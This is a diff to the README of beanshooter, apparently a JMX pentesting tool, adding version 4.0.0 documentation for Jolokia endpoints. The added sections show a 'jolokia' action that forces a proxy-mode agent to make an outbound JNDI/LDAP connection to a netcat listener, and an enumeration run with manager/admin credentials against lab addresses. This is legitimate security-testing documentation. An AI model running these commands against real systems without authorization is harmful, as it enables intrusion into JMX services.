@@ -8,7 +8,7 @@
 ![](https://github.com/qtc-de/beanshooter/workflows/develop%20maven%20CI/badge.svg?branch=develop)
 ![](https://img.shields.io/badge/java-8%2b-blue)
 [![](https://img.shields.io/badge/build%20system-maven-blue)](https://maven.apache.org/)
-[![](https://img.shields.io/badge/version-3.1.1-blue)](https://github.com/qtc-de/beanshooter/releases)
+[![](https://img.shields.io/badge/version-4.0.0-blue)](https://github.com/qtc-de/beanshooter/releases)
 [![](https://img.shields.io/badge/license-GPL%20v3.0-blue)](https://github.com/qtc-de/beanshooter/blob/master/LICENSE)
 
 
@@ -30,7 +30,8 @@ installed, just execute the following commands to create an executable ``.jar`` 
 
 You can also use prebuild packages that are created for [each release](https://github.com/qtc-de/beanshooter/releases).
 Prebuild packages for the development branch are created automatically and can be found on the *GitHub*
-[actions page](https://github.com/qtc-de/beanshooter/actions).
+[actions page](https://github.com/qtc-de/beanshooter/actions). Also a prebuild docker image for running *beanshooter*
+[is available](#docker-image).
 
 *beanshooter* does not include *ysoserial* as a dependency. To enable *ysoserial* support, you need either specify the path
 to your ``ysoserial.jar`` file as additional argument (e.g. ``--yso /opt/ysoserial.jar``) or you change the
@@ -58,6 +59,7 @@ autocompletion.
     - [enum](#enum)
     - [info](#info)
     - [invoke](#invoke)
+    - [jolokia](#jolokia)
     - [list](#list)
     - [serial](#serial)
     - [stager](#stager)
@@ -103,6 +105,7 @@ autocompletion.
       + [upload](#tonka-upload)
       + [download](#tonka-download)
 - [JMXMP](#jmxmp)
+- [Jolokia Support](#jolokia-support)
 - [Docker Image](#docker-image)
 - [Example Server](#example-server)
 
@@ -403,6 +406,34 @@ Arguments:
 
 For more complex argument types that require some initialization, you can use *beanshooters PluginSystem* and define a custom
 class that implements the [IArgumentProvider Interface](beanshooter/src/de/qtc/beanshooter/plugin/IArgumentProvider.java).
+
+
+#### Jolokia
+
+As outlined in *beanshooters* [Jolokia documentation](/docs/jolokia.md), almost all *beanshooter* actions can be used together
+with the `--jolokia` switch to target *Jolokia* based *JMX* endpoints. Apart from this generic support for the *Jolokia JMX*
+adapter, *beanshooter* supports one dedicated `jolokia` action. This action can be used to force an outbound connection of a
+*Jolokia* agent running with proxy mode enabled:
+
+```console
+[qtc@devbox ~]$ beanshooter jolokia 172.17.0.2 8080 172.17.0.1 4444 --username manager --password admin --ldap
+[+] Attempting to trigger outboud connection to 172.17.0.1:4444
+[+] Using proxy service URL: service:jmx:Rmi:///jndi/ldap://172.17.0.1:4444/beanshooter
+...
+
+[qtc@devbox ~]$ nc -vlp 4444
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 172.17.0.2.
+Ncat: Connection from 172.17.0.2:60052.
+0
+```
+
+The same result could be achieved by invoking a regular *beanshooter* operation like `list` and using the `--jolokia-proxy service:jmx:...`
+option. The `jolokia` action was added as a shortcut so you do not need to remember the *JNDI* syntax. When using the
+`jolokia` action, the `--jolokia` option is assumed by default.
+
 
 #### List
 
@@ -1193,6 +1224,44 @@ mechanism is usually possible, the required *TLS* setting cannot be enumerated:
 [+] 	- JMXMP serial check is work in progress but endpoints are usually vulnerable.
 [+] 	  Configuration Status: Undecided
 ```
+
+
+### Jolokia Support
+
+---
+
+Starting from *v4.0.0*, *beanshooter* supports [Jolokia](https://github.com/rhuss/jolokia) based JMX endpoints.
+Establishing connections to a *Jolokia* based endpoint requires the usual target format and the `--jolokia` flag:
+
+```console
+[qtc@devbox ~]$ beanshooter enum 172.17.0.2 8080 --jolokia --username manager --password admin
+[+] Checking specified credentials:
+[+]
+[+] 	- Login successful! The specified credentials are correct.
+[+] 	  Username: manager  - Password: admin
+[+]
+[+] Checking Jolokia Version:
+[+]
+[+] 	- Agent Version 1.7.1 - Protocol Version: 7.2
+[+] 	  Vulnerability Status: Non Vulnerable
+[+]
+[+] Checking whether Jolokia Proxy Mode is enabled:
+[+]
+[+] 	- Jolokia Proxy Mode is enabled! You may connect to backend JMX services.
+[+] 	  Vulnerability Status: Vulnerable
+[+]
+[+] Checking available MBeans:
+[+]
+[+] 	- 75 MBeans are currently registred on the MBean server.
+[+] 	  Listing 56 non default MBeans:
+...
+```
+
+Due to the limited feature set of *Jolokia*, not all *beanshooter* operations are supported. Please
+consult the [Jolokia FAQ](/docs/jolokia.md#faq) if you have any questions. For playing around with
+*Jolokia*, *beanshooter* provides an [example server](https://github.com/qtc-de/beanshooter/pkgs/container/beanshooter%2Fjolokia-example-server)
+that exposes an *Jolokia* endpoint on port `8080`. Additionally, a regular *RMI* based *JMX* endpoint
+can be found on port `1090`.
 
 
 ### Docker Image
